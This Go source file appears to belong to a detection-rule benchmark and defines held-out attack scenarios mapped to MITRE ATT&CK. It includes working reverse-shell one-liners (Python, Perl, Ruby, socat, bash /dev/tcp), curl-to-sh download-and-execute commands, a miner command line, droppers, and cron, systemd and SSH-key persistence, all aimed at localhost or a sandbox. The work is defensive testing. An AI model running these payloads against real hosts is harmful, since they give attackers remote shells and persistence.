package bench

// This file adds an independent, "held-out" scenario set. Unlike scenarios.go,
// these were written from attacker behaviour (mapped to MITRE ATT&CK), not from
// the detection rules, so the measured rate is an honest number that can fall
// below 100%. A scenario that no current rule catches is an expected, useful
// result: its Expect names the rule(s) that *should* ideally fire, and the
// runner records the miss without any scenario being tuned to the rules.
//
// Every scenario is harmless and self-contained, exactly like the built-in set:
// network targets are 127.0.0.1 (a closed port, or an in-process listener the
// benchmark itself controls), files are written only inside the Sandbox, and no
// real malware runs. The reverse-shell samples hand a shell's stdio to a socket
// connected to a listener started here and fed two inert commands, mirroring the
// pattern in scenarios.go without reusing its code.
//
// Scenarios that need a tool which may be absent (crontab, systemd-run, socat,
// ...) are both guarded at run time with errSkip and filtered out up front by
// HeldoutScenarios, so a missing tool never counts as a missed detection.

import (
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"time"
)

// errSkip is returned by a scenario whose required tool is not installed. It is
// a belt-and-braces guard: HeldoutScenarios already filters such scenarios out.
var errSkip = errors.New("required tool not available")

// heldoutCandidate pairs a scenario with the external binary it needs, if any.
type heldoutCandidate struct {
	tool string // required binary on PATH; "" when the scenario needs none
	sc   Scenario
}

// guard wraps a Run so it reports errSkip when its tool has gone missing.
func guard(tool string, fn func(*Sandbox) error) func(*Sandbox) error {
	return func(s *Sandbox) error {
		if _, err := exec.LookPath(tool); err != nil {
			return errSkip
		}
		return fn(s)
	}
}

// HeldoutScenarios returns the held-out set, with tool-dependent scenarios whose
// binary is not on PATH filtered out so they are not scored as misses.
func HeldoutScenarios() []Scenario {
	var out []Scenario
	for _, c := range heldoutCandidates() {
		if c.tool != "" {
			if _, err := exec.LookPath(c.tool); err != nil {
				continue
			}
		}
		out = append(out, c.sc)
	}
	return out
}

func heldoutCandidates() []heldoutCandidate {
	return []heldoutCandidate{
		// --- Interpreter reverse shells: do rules that key on shell names
		// also see shells launched (via socket+exec) by an interpreter? ---
		{tool: "python3", sc: Scenario{
			Name: "python-reverse-shell", Technique: "T1059.006", Tactic: "command-and-control",
			Expect: []string{"SBS-PROC-003"},
			Run: guard("python3", func(*Sandbox) error {
				return revShellConnect(func(port int) *exec.Cmd {
					src := fmt.Sprintf(`import socket,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",%d))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
os.execv("/bin/sh",["/bin/sh","-i"])`, port)
					return exec.Command("python3", "-c", src)
				})
			}),
		}},
		{tool: "perl", sc: Scenario{
			Name: "perl-reverse-shell", Technique: "T1059.004", Tactic: "command-and-control",
			Expect: []string{"SBS-PROC-003"},
			Run: guard("perl", func(*Sandbox) error {
				return revShellConnect(func(port int) *exec.Cmd {
					src := fmt.Sprintf(`use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));`+
						`connect(S,sockaddr_in(%d,inet_aton("127.0.0.1")));`+
						`open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");`, port)
					return exec.Command("perl", "-e", src)
				})
			}),
		}},
		{tool: "ruby", sc: Scenario{
			Name: "ruby-reverse-shell", Technique: "T1059.004", Tactic: "command-and-control",
			Expect: []string{"SBS-PROC-003"},
			Run: guard("ruby", func(*Sandbox) error {
				return revShellConnect(func(port int) *exec.Cmd {
					src := fmt.Sprintf(`require "socket";s=TCPSocket.new("127.0.0.1",%d);`+
						`$stdin.reopen(s);$stdout.reopen(s);$stderr.reopen(s);exec("/bin/sh -i")`, port)
					return exec.Command("ruby", "-e", src)
				})
			}),
		}},
		{tool: "socat", sc: Scenario{
			// socat wires the shell to the socket through a unix socketpair (not
			// "inet") and spells the directive EXEC: in upper case, so this is
			// likely a miss against both reverse-shell rules.
			Name: "socat-reverse-shell", Technique: "T1059.004", Tactic: "command-and-control",
			Expect: []string{"SBS-PROC-003", "SBS-PROC-004"},
			Run: guard("socat", func(*Sandbox) error {
				return revShellConnect(func(port int) *exec.Cmd {
					return exec.Command("socat", fmt.Sprintf("TCP:127.0.0.1:%d", port), "EXEC:/bin/sh")
				})
			}),
		}},

		// --- Detached sessions: does a new session / ignored SIGHUP hide the
		// child from the agent? ---
		{tool: "setsid", sc: Scenario{
			Name: "setsid-detached-miner", Technique: "T1496", Tactic: "impact",
			Expect: []string{"SBS-PROC-010"},
			Run: guard("setsid", func(*Sandbox) error {
				return sh(`setsid sh -c ': --donate-level 1 -o stratum+tcp://127.0.0.1:3333; sleep 0.5'`)
			}),
		}},
		{tool: "nohup", sc: Scenario{
			Name: "nohup-download-exec", Technique: "T1059.004", Tactic: "execution",
			Expect: []string{"SBS-PROC-001"},
			Run: guard("nohup", func(*Sandbox) error {
				return sh(`nohup sh -c 'curl -fsS --max-time 1 http://127.0.0.1:9/p | sh' >/dev/null 2>&1; sleep 0.5`)
			}),
		}},

		// --- Interpreter spawning a shell via os.system (no exec). ---
		{tool: "python3", sc: Scenario{
			Name: "python-ossystem-spawn-sh", Technique: "T1059.006", Tactic: "execution",
			Expect: []string{"SBS-PROC-001"},
			Run: guard("python3", func(*Sandbox) error {
				return sh(`python3 -c 'import os;os.system("curl -fsS --max-time 1 http://127.0.0.1:9/x | sh")'; sleep 0.5`)
			}),
		}},

		// --- Staged droppers run from a non-watched sandbox dir. The temp-exec
		// rule inspects process.exe, which is /bin/sh for a shebang script, so a
		// dropped *script* slips past it; a dropped *ELF* does not. ---
		{sc: Scenario{
			Name: "dropper-script-home-exec", Technique: "T1204.002", Tactic: "execution",
			Expect: []string{"SBS-PROC-005", "SBS-FILE-005", "SBS-PROC-015"},
			Run: func(s *Sandbox) error {
				dir := s.Dir("home", "app")
				if err := os.MkdirAll(dir, 0o755); err != nil {
					return err
				}
				p := s.Dir("home", "app", ".update.sh")
				if err := os.WriteFile(p, []byte("#!/bin/sh\nsleep 0.5\n"), 0o755); err != nil {
					return err
				}
				return runTimeout(exec.Command(p), 5*time.Second)
			},
		}},
		{sc: Scenario{
			Name: "base64-elf-home-exec", Technique: "T1027", Tactic: "defense-evasion",
			Expect: []string{"SBS-PROC-005", "SBS-FILE-005"},
			Run: func(s *Sandbox) error {
				raw, err := os.ReadFile("/bin/sleep")
				if err != nil {
					return err
				}
				// Model an attacker who ships the ELF base64-encoded and decodes it on disk.
				decoded, err := base64.StdEncoding.DecodeString(base64.StdEncoding.EncodeToString(raw))
				if err != nil {
					return err
				}
				dir := s.Dir("home", "bin")
				if err := os.MkdirAll(dir, 0o755); err != nil {
					return err
				}
				p := s.Dir("home", "bin", "sysupdate")
				if err := os.WriteFile(p, decoded, 0o755); err != nil {
					return err
				}
				return runTimeout(exec.Command(p, "0.5"), 5*time.Second)
			},
		}},

		// --- Content signatures reached through written-file scanning. These are
		// authentic artifacts (the strings are what the real samples contain),
		// not files crafted to game a rule. ---
		{sc: Scenario{
			Name: "reverse-shell-script-dropped", Technique: "T1059.004", Tactic: "command-and-control",
			Expect: []string{"sig:Linux.Backdoor.ReverseShell.Script"},
			Run: func(s *Sandbox) error {
				body := "#!/bin/bash\nbash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n"
				return os.WriteFile(s.Dir("drop", "connect.sh"), []byte(body), 0o644)
			},
		}},
		{sc: Scenario{
			Name: "mirai-sample-dropped", Technique: "T1105", Tactic: "command-and-control",
			Expect: []string{"sig:Linux.Trojan.Mirai.Strings"},
			Run: func(s *Sandbox) error {
				body := "inert sample for benchmarking only\n/bin/busybox MIRAI\ndvrHelper\nLOLNOGTFO\n"
				return os.WriteFile(s.Dir("drop", "mirai.sample"), []byte(body), 0o644)
			},
		}},
		{sc: Scenario{
			Name: "ldpreload-source-dropped", Technique: "T1574.006", Tactic: "persistence",
			Expect: []string{"sig:Linux.Rootkit.LDPreload.Generic"},
			Run: func(s *Sandbox) error {
				body := "#include <dlfcn.h>\n" +
					"// installs itself into /etc/ld.so.preload\n" +
					"static int (*real_readdir)(void*);\n" +
					"void* hook(void){ return dlsym(RTLD_NEXT, \"readdir\"); }\n"
				return os.WriteFile(s.Dir("drop", "rootkit.c"), []byte(body), 0o644)
			},
		}},

		// --- File-watch and watch-path coverage gaps (expected misses). ---
		{tool: "crontab", sc: Scenario{
			// crontab - writes to /var/spool/cron, which the benchmark config does
			// not watch, and no rule keys on the crontab process itself.
			Name: "crontab-stdin-persistence", Technique: "T1053.003", Tactic: "persistence",
			Expect: []string{"SBS-FILE-001"},
			Run: guard("crontab", func(*Sandbox) error {
				// An unknown user makes crontab error out before touching anything.
				return sh(`echo '* * * * * /bin/true' | crontab -u sbs-bench-nouser-xyz - 2>/dev/null; sleep 0.3`)
			}),
		}},
		{tool: "systemd-run", sc: Scenario{
			// A transient unit lives under /run, not /etc/systemd/system, so the
			// persistence watch never sees it (and it fails harmlessly without a bus).
			Name: "systemd-run-transient", Technique: "T1053.006", Tactic: "persistence",
			Expect: []string{"SBS-FILE-001", "SBS-PROC-016"},
			Run: guard("systemd-run", func(*Sandbox) error {
				return sh(`systemd-run --scope --quiet sleep 0.3 2>/dev/null; sleep 0.3`)
			}),
		}},
		{sc: Scenario{
			// authorized_keys dropped outside the watched ~/.ssh: the name-based
			// rule can only fire for files the watcher actually reports.
			Name: "ssh-key-nonstandard-path", Technique: "T1098.004", Tactic: "persistence",
			Expect: []string{"SBS-FILE-002"},
			Run: func(s *Sandbox) error {
				dir := s.Dir("home", "config", "keys")
				if err := os.MkdirAll(dir, 0o700); err != nil {
					return err
				}
				key := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBenchmarkOnlyNotARealKey heldout@sbs-bench\n"
				return os.WriteFile(s.Dir("home", "config", "keys", "authorized_keys"), []byte(key), 0o600)
			},
		}},
		{sc: Scenario{
			// The preload watch is scoped to the exact filename ld.so.preload, so a
			// sibling under the same directory is filtered out before any rule runs.
			Name: "ldpreload-alt-filename", Technique: "T1574.006", Tactic: "persistence",
			Expect: []string{"SBS-FILE-003"},
			Run: func(s *Sandbox) error {
				return os.WriteFile(s.Dir("etc", "ld.so.preload.bak"), []byte("/usr/lib/libheldout.so\n"), 0o644)
			},
		}},
	}
}

// revShellConnect runs cmd, built for the chosen port, against a TCP listener the
// benchmark controls on 127.0.0.1. The listener accepts the shell's connection,
// feeds it two inert commands and closes it, so nothing escapes the process.
func revShellConnect(mk func(port int) *exec.Cmd) error {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return err
	}
	defer ln.Close()
	_, ps, err := net.SplitHostPort(ln.Addr().String())
	if err != nil {
		return err
	}
	port, err := strconv.Atoi(ps)
	if err != nil {
		return err
	}
	go func() {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		defer c.Close()
		c.SetDeadline(time.Now().Add(5 * time.Second))
		c.Write([]byte("id >/dev/null 2>&1; sleep 0.5; exit\n"))
		io.Copy(io.Discard, c)
	}()
	cmd := mk(port)
	cmd.Stdout, cmd.Stderr = io.Discard, io.Discard
	return runTimeout(cmd, 6*time.Second)
}
